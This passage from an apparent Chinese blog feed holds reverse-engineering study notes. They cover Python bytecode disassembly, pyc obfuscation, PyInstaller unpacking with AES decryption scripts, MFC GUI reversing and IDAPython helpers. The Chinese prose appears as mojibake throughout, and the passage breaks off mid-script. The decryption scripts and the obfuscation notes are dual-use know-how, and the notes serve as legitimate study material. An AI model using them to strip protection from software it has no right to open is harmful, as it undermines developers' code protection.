class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">4</span> LOAD_CONST <span class="number">2</span> (<span class="number">3</span>)</span><br><span class="line"><span class="number">6</span> BUILD_LIST <span class="number">3</span></span><br><span class="line"><span class="number">8</span> STORE_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">2</span> <span class="number">10</span> LOAD_CONST <span class="number">3</span> (<span class="number">10</span>)</span><br><span class="line"><span class="number">12</span> BUILD_LIST <span class="number">1</span></span><br><span class="line"><span class="number">14</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">16</span> LOAD_CONST <span class="number">4</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">18</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">20</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">22</span> BUILD_SLICE <span class="number">3</span></span><br><span class="line"><span class="number">24</span> STORE_SUBSCR</span><br><span class="line"><span class="number">3</span> <span class="number">26</span> LOAD_CONST <span class="number">5</span> (<span class="number">11</span>)</span><br><span class="line"><span class="number">28</span> BUILD_LIST <span class="number">1</span></span><br><span class="line"><span class="number">30</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">32</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">34</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">36</span> BUILD_SLICE <span class="number">2</span></span><br><span class="line"><span class="number">38</span> STORE_SUBSCR</span><br><span class="line"><span class="number">4</span> <span class="number">40</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">42</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">44</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">46</span> BUILD_SLICE <span class="number">2</span></span><br><span class="line"><span class="number">48</span> BINARY_SUBSCR</span><br><span class="line"><span class="number">50</span> STORE_NAME <span class="number">1</span> (a)</span><br><span class="line"><span class="number">5</span> <span class="number">52</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">54</span> LOAD_CONST <span class="number">4</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">56</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">58</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">60</span> BUILD_SLICE <span class="number">3</span></span><br><span class="line"><span class="number">62</span> BINARY_SUBSCR</span><br><span class="line"><span class="number">64</span> STORE_NAME <span class="number">2</span> (b)</span><br></pre></td></tr></table></figure><p>å¯¹åº” python ä»£ç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">k = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">k[<span class="number">0</span>:<span class="number">1</span>:<span class="number">1</span>] = [<span class="number">10</span>]</span><br><span class="line">k[<span class="number">1</span>:<span class="number">2</span>] = [<span class="number">11</span>]</span><br><span class="line">a = k[<span class="number">1</span>:<span class="number">2</span>]</span><br><span class="line">b = k[<span class="number">0</span>:<span class="number">1</span>:<span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="æ¡ä»¶åˆ¤æ–­"><a href="#æ¡ä»¶åˆ¤æ–­" class="headerlink" title="æ¡ä»¶åˆ¤æ–­"></a><strong>æ¡ä»¶åˆ¤æ–­</strong></h3><p>ä»¥ä¸‹æŒ‡ä»¤ä¸€èˆ¬ç”¨äºåˆ†æ”¯åˆ¤æ–­è·³è½¬ï¼š</p><p>POP_JUMP_IF_FALSE ï¼šè¡¨ç¤ºæ¡ä»¶ç»“æœä¸º FALSE å°±è·³è½¬åˆ°ç›®æ ‡åç§»æŒ‡ä»¤</p><p>JUMP_FORWARD ï¼šç›´æ¥è·³è½¬åˆ°ç›®æ ‡åç§»æŒ‡ä»¤</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">2</span> <span class="number">4</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">6</span> LOAD_CONST <span class="number">1</span> (<span class="number">5</span>)</span><br><span class="line"><span class="number">8</span> COMPARE_OP <span class="number">0</span> (&lt;)</span><br><span class="line"><span class="number">10</span> POP_JUMP_IF_FALSE <span class="number">22</span></span><br><span class="line"><span class="number">3</span> <span class="number">12</span> LOAD_NAME <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">14</span> LOAD_CONST <span class="number">2</span> (<span class="string">&#x27;i &lt; 5&#x27;</span>)</span><br><span class="line"><span class="number">16</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">18</span> POP_TOP</span><br><span class="line"><span class="number">20</span> JUMP_FORWARD <span class="number">26</span> (to <span class="number">48</span>)</span><br><span class="line"><span class="number">4</span> &gt;&gt; <span class="number">22</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">24</span> LOAD_CONST <span class="number">1</span> (<span class="number">5</span>)</span><br><span class="line"><span class="number">26</span> COMPARE_OP <span class="number">4</span> (&gt;)</span><br><span class="line"><span class="number">28</span> POP_JUMP_IF_FALSE <span class="number">40</span></span><br><span class="line"><span class="number">5</span> <span class="number">30</span> LOAD_NAME <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">32</span> LOAD_CONST <span class="number">3</span> (<span class="string">&#x27;i &gt; 5&#x27;</span>)</span><br><span class="line"><span class="number">34</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">36</span> POP_TOP</span><br><span class="line"><span class="number">38</span> JUMP_FORWARD <span class="number">8</span> (to <span class="number">48</span>)</span><br><span class="line"><span class="number">7</span> &gt;&gt; <span class="number">40</span> LOAD_NAME <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">42</span> LOAD_CONST <span class="number">4</span> (<span class="string">&#x27;i = 5&#x27;</span>)</span><br><span class="line"><span class="number">44</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">46</span> POP_TOP</span><br></pre></td></tr></table></figure><p>å¯¹åº” python ä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> i &lt; <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i &lt; 5&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> i &gt; <span class="number">5</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i &gt; 5&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;i = 5&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a><strong>å¾ªç¯</strong></h3><h4 id="while-å¾ªç¯"><a href="#while-å¾ªç¯" class="headerlink" title="while å¾ªç¯"></a><strong>while</strong> <strong>å¾ªç¯</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">2</span> &gt;&gt; <span class="number">4</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">6</span> LOAD_CONST <span class="number">1</span> (<span class="number">10</span>)</span><br><span class="line"><span class="number">8</span> COMPARE_OP <span class="number">0</span> (&lt;)</span><br><span class="line"><span class="number">10</span> POP_JUMP_IF_FALSE <span class="number">22</span></span><br><span class="line"><span class="number">3</span> <span class="number">12</span> LOAD_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">14</span> LOAD_CONST <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">16</span> INPLACE_ADD</span><br><span class="line"><span class="number">18</span> STORE_NAME <span class="number">0</span> (i)</span><br><span class="line"><span class="number">20</span> JUMP_ABSOLUTE <span class="number">4</span></span><br></pre></td></tr></table></figure><p>å¯¹åº” python ä»£ç ï¼š</p><p>i &#x3D; 0</p><p>while i &lt; 10:</p><p>i +&#x3D; 1</p><h4 id="forâ€¦in-ç»“æ„"><a href="#forâ€¦in-ç»“æ„" class="headerlink" title="forâ€¦in ç»“æ„"></a><strong>forâ€¦in</strong> <strong>ç»“æ„</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204125219815.png" alt="image-20240204125219815"></p><p>å¯¹åº” python ä»£ç ï¼š</p><p>for i in range(10):</p><p>print(i ^ 3)</p><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a><strong>å‡½æ•°</strong></h3><h4 id="å‡½æ•°èŒƒå›´"><a href="#å‡½æ•°èŒƒå›´" class="headerlink" title="å‡½æ•°èŒƒå›´"></a><strong>å‡½æ•°èŒƒå›´</strong></h4><p>å‰é¢ä»‹ç»ç¬¬äºŒåˆ—è¡¨ç¤ºæŒ‡ä»¤åœ¨å‡½æ•°ä¸­çš„åç§»åœ°å€ï¼Œæ‰€ä»¥çœ‹åˆ° 0 å°±æ˜¯å‡½æ•°å¼€å§‹ï¼Œä¸‹ä¸€ä¸ª 0 å‰ä¸€æ¡æŒ‡ä»¤å°±æ˜¯å‡½</p><p>æ•°ç»“æŸä½ç½®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡ RETURN_VALUE æ¥ç¡®å®šå‡½æ•°ç»“å°¾ã€‚</p><h4 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a><strong>å‡½æ•°è°ƒç”¨</strong></h4><p>å‡½æ•°è°ƒç”¨ç±»ä¼¼äº push + call çš„æ±‡ç¼–ç»“æ„ï¼Œå‹æ ˆå‚æ•°ä»å·¦åˆ°å³ä¾æ¬¡å‹å…¥ï¼ˆå½“ç„¶ä¸æ˜¯ push ï¼Œè€Œæ˜¯è¯»å–</p><p>æŒ‡ä»¤ LOAD_xxxx æ¥æŒ‡å®šå‚æ•°ï¼‰ã€‚</p><p>å…ˆæŒ‡å®šè¦è°ƒç”¨çš„å‡½æ•°ï¼ˆ LOAD_NAME æˆ– LOAD_GLOBAL ï¼‰ï¼Œç„¶åå‹å‚æ•°ï¼Œæœ€åé€šè¿‡ CALL_FUNCTION è°ƒ</p><p>ç”¨ã€‚</p><p>CALL_FUNCTION åé¢çš„å€¼è¡¨ç¤ºæœ‰å‡ ä¸ªå‚æ•°ã€‚</p><p>æ”¯æŒåµŒå¥—è°ƒç”¨</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204125253249.png" alt="image-20240204125253249"></p><p>å¯¹åº”çš„ python ä»£ç ä¸ºï¼š</p><p>n &#x3D; 100</p><p>root &#x3D; int(math.sqrt(n))</p><h2 id="pyc-åŠ èŠ±æ··æ·†"><a href="#pyc-åŠ èŠ±æ··æ·†" class="headerlink" title="pyc åŠ èŠ±æ··æ·†"></a><strong>pyc</strong> <strong>åŠ èŠ±æ··æ·†</strong></h2><p>ç”±ä¸Šé¢çš„ç‰ˆå—æˆ‘ä»¬çŸ¥é“ pyc æ˜¯å¯ä»¥åç¼–è¯‘çš„ï¼Œè€Œä¸”ç›®å‰ä¹Ÿæœ‰ç°æˆçš„å·¥å…·ã€‚ä½†è¿™äº›å·¥å…·å®ƒä¼šå°†æ¯ä¸€ä¸ªæŒ‡ä»¤</p><p>éƒ½è§£æå‡ºæ¥ï¼Œæ‰€ä»¥å­—èŠ‚ç æ··æ·†çš„æ–¹å¼å°±æ˜¯å¾€é‡Œé¢æ’å…¥ä¸€äº›æ¶æ„æŒ‡ä»¤ï¼ˆæ¯”å¦‚åŠ è½½è¶…å‡ºèŒƒå›´çš„æ•°æ®ï¼‰ï¼Œè®©å</p><p>ç¼–è¯‘å·¥å…·åœ¨è§£æçš„æ—¶å€™æŠ¥é”™ï¼Œä»è€Œå¤±å»ä½œç”¨ã€‚</p><p>ä½†æ’å…¥çš„æ¶æ„æŒ‡ä»¤è¿˜ä¸èƒ½å½±å“è§£é‡Šå™¨æ‰§è¡Œï¼Œå› æ­¤è¿˜è¦æ’å…¥ä¸€äº›è·³è½¬æŒ‡ä»¤ï¼Œä»è€Œè®©è§£é‡Šå™¨è·³è¿‡æ¶æ„æŒ‡ä»¤ã€‚</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204125318308.png" alt="image-20240204125318308"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204194442966.png" alt="image-20240204194442966"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204194452686.png" alt="image-20240204194452686"></p><h2 id="pyinstaller-åº”ç”¨"><a href="#pyinstaller-åº”ç”¨" class="headerlink" title="pyinstaller åº”ç”¨"></a><strong>pyinstaller</strong> <strong>åº”ç”¨</strong></h2><h3 id="æ™®é€šæ‰“åŒ…"><a href="#æ™®é€šæ‰“åŒ…" class="headerlink" title="æ™®é€šæ‰“åŒ…"></a><strong>æ™®é€šæ‰“åŒ…</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200105807.png" alt="image-20240204200105807"></p><h4 id="exeé€†å‘"><a href="#exeé€†å‘" class="headerlink" title="exeé€†å‘"></a>exeé€†å‘</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200135481.png" alt="image-20240204200135481"></p><h4 id="elfé€†å‘"><a href="#elfé€†å‘" class="headerlink" title="elfé€†å‘"></a>elfé€†å‘</h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200150021.png" alt="image-20240204200150021"></p><h3 id="ä½¿ç”¨-key-å‚æ•°æ‰“åŒ…"><a href="#ä½¿ç”¨-key-å‚æ•°æ‰“åŒ…" class="headerlink" title="ä½¿ç”¨ key å‚æ•°æ‰“åŒ…"></a><strong>ä½¿ç”¨</strong> <strong>key</strong> <strong>å‚æ•°æ‰“åŒ…</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200214641.png" alt="image-20240204200214641"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240204200221556.png" alt="image-20240204200221556"></p><h4 id="version-lt-4-0"><a href="#version-lt-4-0" class="headerlink" title="version &lt; 4.0"></a><strong>version &lt; 4.0</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For pyinstaller &lt; 4.0</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">CRYPT_BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"><span class="comment"># key obtained from pyimod00_crypto_key</span></span><br><span class="line">key = <span class="string">&#x27;this_is_a_secret&#x27;</span></span><br><span class="line">inf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc.encrypted&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># encrypted file input</span></span><br><span class="line">outf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="comment"># output file</span></span><br><span class="line"><span class="comment"># Initialization vector</span></span><br><span class="line">iv = inf.read(CRYPT_BLOCK_SIZE)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line"><span class="comment"># Decrypt and decompress</span></span><br><span class="line">plaintext = zlib.decompress(cipher.decrypt(inf.read()))</span><br><span class="line"><span class="comment"># Write pyc header</span></span><br><span class="line"><span class="comment"># The header below is for Python 2.7</span></span><br><span class="line">outf.write(<span class="string">&#x27;\x03\xf3\x0d\x0a\0\0\0\0&#x27;</span>)</span><br><span class="line"><span class="comment"># Write decrypted data</span></span><br><span class="line">outf.write(plaintext)</span><br><span class="line">inf.close()</span><br><span class="line">outf.close()</span><br></pre></td></tr></table></figure><h4 id="version-gt-x3D-4-0"><a href="#version-gt-x3D-4-0" class="headerlink" title="version &gt;&#x3D; 4.0"></a><strong>version &gt;&#x3D; 4.0</strong></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For pyinstaller &gt;= 4.0</span></span><br><span class="line"><span class="keyword">import</span> tinyaes</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">CRYPT_BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"><span class="comment"># key obtained from pyimod00_crypto_key</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">&#x27;this_is_a_secret&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">inf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc.encrypted&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># encrypted file input</span></span><br><span class="line">outf = <span class="built_in">open</span>(<span class="string">&#x27;test.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="comment"># output file</span></span><br><span class="line"><span class="comment"># Initialization vector</span></span><br><span class="line">iv = inf.read(CRYPT_BLOCK_SIZE)</span><br><span class="line">cipher = tinyaes.AES(key, iv)</span><br><span class="line"><span class="comment"># Decrypt and decompress</span></span><br><span class="line">plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))</span><br><span class="line"><span class="comment"># Write pyc header</span></span><br><span class="line"><span class="comment"># The header below is for Python 3.8</span></span><br><span class="line">outf.write(<span class="string">b&#x27;\x55\x0d\x0d\x0a\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span>)</span><br><span class="line"><span class="comment"># Write decrypted data</span></span><br><span class="line">outf.write(plaintext)</span><br><span class="line">inf.close()</span><br><span class="line">outf.close()</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘ pyimod02_archive.pyc ï¼š</p><p>pyinstaller &lt; 4.0 &#x3D;&gt; pycrypto &amp; CFB</p><p>pyinstaller &gt;&#x3D; 4.0 &#x3D;&gt; tinyaes &amp; CTR</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pythoné€†å‘&quot;&gt;&lt;a href=&quot;#Pythoné€†å‘&quot; class=&quot;headerlink&quot; title=&quot;Pythoné€†å‘&quot;&gt;&lt;/a&gt;Pythoné€†å‘&lt;/h1&gt;&lt;h2 id=&quot;pycæ–‡ä»¶&quot;&gt;&lt;a href=&quot;#pycæ–‡ä»¶&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="python é€†å‘" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/python-%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/03/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/03/MFC%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/</id>
    <published>2024-02-03T03:42:48.110Z</published>
    <updated>2024-02-04T04:24:55.708Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><h1 id="MFCå›¾å½¢åŒ–ç•Œé¢"><a href="#MFCå›¾å½¢åŒ–ç•Œé¢" class="headerlink" title="MFCå›¾å½¢åŒ–ç•Œé¢"></a>MFCå›¾å½¢åŒ–ç•Œé¢</h1><h2 id="windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹"><a href="#windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹" class="headerlink" title="windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹"></a>windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹</h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202804698.png" alt="image-20240203202804698"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202813056.png" alt="image-20240203202813056"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202823482.png" alt="image-20240203202823482"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202851227.png" alt="image-20240203202851227"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202903575.png" alt="image-20240203202903575"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202911473.png" alt="image-20240203202911473"></p><h2 id="MFC-æ­£å‘å¼€å‘"><a href="#MFC-æ­£å‘å¼€å‘" class="headerlink" title="MFC æ­£å‘å¼€å‘"></a><strong>MFC</strong> <strong>æ­£å‘å¼€å‘</strong></h2><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202925910.png" alt="image-20240203202925910"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240203202934106.png" alt="image-20240203202934106"></p><h2 id="é€†å‘æ€è·¯"><a href="#é€†å‘æ€è·¯" class="headerlink" title="é€†å‘æ€è·¯"></a><strong>é€†å‘æ€è·¯</strong></h2><ul><li><p>é€šè¿‡ ResourceHacker å¯ä»¥è·å–æ§ä»¶çš„ ID å·ã€ä¿®æ”¹æ§ä»¶å¸ƒå±€ç­‰</p></li><li><p>é€šè¿‡ xspy å¯ä»¥è·å–æ§ä»¶æ¶ˆæ¯æ‰€å¯¹åº”çš„å¤„ç†å‡½æ•°åœ°å€</p></li><li><p>é€šè¿‡ GetDlgItem &#x2F; GetDlgItemText &#x2F; GetDlgItemInt &#x2F; GetWindowText ç³»åˆ— API æ‰¾åˆ°å…³é”®å‡½æ•°</p></li></ul><p>æ‰¾åˆ°å…³é”®å‡½æ•°åï¼Œå³ä¸ºå¸¸è§„é€†å‘</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;hr&gt;
&lt;h1 id=&quot;MFCå›¾å½¢åŒ–ç•Œé¢&quot;&gt;&lt;a href=&quot;#MFCå›¾å½¢åŒ–ç•Œé¢&quot; class=&quot;headerlink&quot; title=&quot;MFCå›¾å½¢åŒ–ç•Œé¢&quot;&gt;&lt;/a&gt;MFCå›¾å½¢åŒ–ç•Œé¢&lt;/h1&gt;&lt;h2 id=&quot;windowsæ¡Œé¢åº”ç”¨ç¼–ç¨‹&quot;&gt;&lt;a href=&quot;#window</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>IDAPythonå¸¸ç”¨å‡½æ•°</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/01/IDAPython%E4%B8%8Eelf%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/01/IDAPython%E4%B8%8Eelf%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B/</id>
    <published>2024-01-31T16:00:00.000Z</published>
    <updated>2024-02-03T12:27:33.866Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDAPythonå¸¸ç”¨å‡½æ•°"><a href="#IDAPythonå¸¸ç”¨å‡½æ•°" class="headerlink" title="IDAPythonå¸¸ç”¨å‡½æ•°"></a>IDAPythonå¸¸ç”¨å‡½æ•°</h1><p><a href="https://hex-rays.com/products/ida/support/idapython_docs/">å®˜æ–¹æ–‡æ¡£</a></p><h2 id="åŸºç¡€API"><a href="#åŸºç¡€API" class="headerlink" title="åŸºç¡€API"></a>åŸºç¡€API</h2><ul><li>here() &#x2F; get_screen_ea()ï¼šè¿”å›å…‰æ ‡å½“å‰æ‰€åœ¨åœ°å€</li><li>get_inf_attr(INF_MIN_EA) &#x2F; get_inf_attr(INF_MAX_EA)ï¼šè·å¾—æœ€å° &#x2F; æœ€å¤§åœ°å€</li><li>generate_disasm_line(ea, GENDSM_FORCE_CODE)ï¼šè·å¾— ea æ‰€åœ¨å¤„çš„ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤</li><li>print_insn_mnem(ea)ï¼šè·å¾— ea æ‰€åœ¨å¤„çš„æŒ‡ä»¤åŠ©è®°ç¬¦</li><li>print_operand(ea, n)ï¼šè·å– ea æ‰€åœ¨å¤„çš„ç¬¬ n ä¸ªæ“ä½œæ•°</li></ul><h2 id="æ®µ"><a href="#æ®µ" class="headerlink" title="æ®µ"></a>æ®µ</h2><ul><li>Segments()ï¼šè¿”å›æ®µçš„å¯éå†å¯¹è±¡</li><li>get_segm_name(ea)ï¼šè·å¾— ea æ‰€åœ¨æ®µå</li><li>get_next_seg(ea)ï¼šè·å–ä¸‹ä¸€ä¸ªæ®µ</li><li>get_segm_start(ea) &#x2F; get_segm_end(ea)ï¼šè·å–æ®µå¼€å§‹ &#x2F; ç»“æŸåœ°å€</li></ul><p>for seg in Segments():</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(f&quot;&#123;get_segm_name(seg)&#125;, &#123;get_segm_start(seg)&#125;, &#123;get_segm_end(seg)&#125;&quot;)</span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p>Functions() &#x2F; Funtions(start_addr, end_addr)ï¼šè¿”å›å‡½æ•°çš„å¯éå†å¯¹è±¡</p><p>get_func_name(ea)ï¼šè¿”å›å‡½æ•°åç§°</p><p>idaapi.get_func(ea)ï¼šè·å¾—è§£æåçš„å‡½æ•°å¯¹è±¡</p><p>get_func_attr(ea, FUNCATTR_START) &#x2F; get_func_attr(ea, FUNCATTR_END)ï¼šè®¿é—®å‡½æ•°è¾¹ç•Œ</p><p>get_next_func(ea) &#x2F; get_prev_func(ea)ï¼šè·å–ä¸Š &#x2F; ä¸‹ä¸€ä¸ªå‡½æ•°</p><p>prev_head(ea) &#x2F; next_head(ea)ï¼šè·å¾—ä¸Š &#x2F; ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€</p><p>FuncItems(ea)ï¼šè·å– ea æ‰€å¤„å‡½æ•°çš„æ‰€æœ‰æŒ‡ä»¤åœ°å€</p><p>eg:æ‰“å°ä¸€ä¸ªå‡½æ•°çš„åæ±‡ç¼–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ea = here()</span><br><span class="line">now = get_func_attr(ea, FUNCATTR_START)</span><br><span class="line">end = get_func_attr(ea, FUNCATTR_END)</span><br><span class="line">while now &lt; end:</span><br><span class="line">print(f&quot;0x&#123;now&#125; &#123;generate_disasm_line(now, 0)&#125;&quot;)</span><br><span class="line">now = 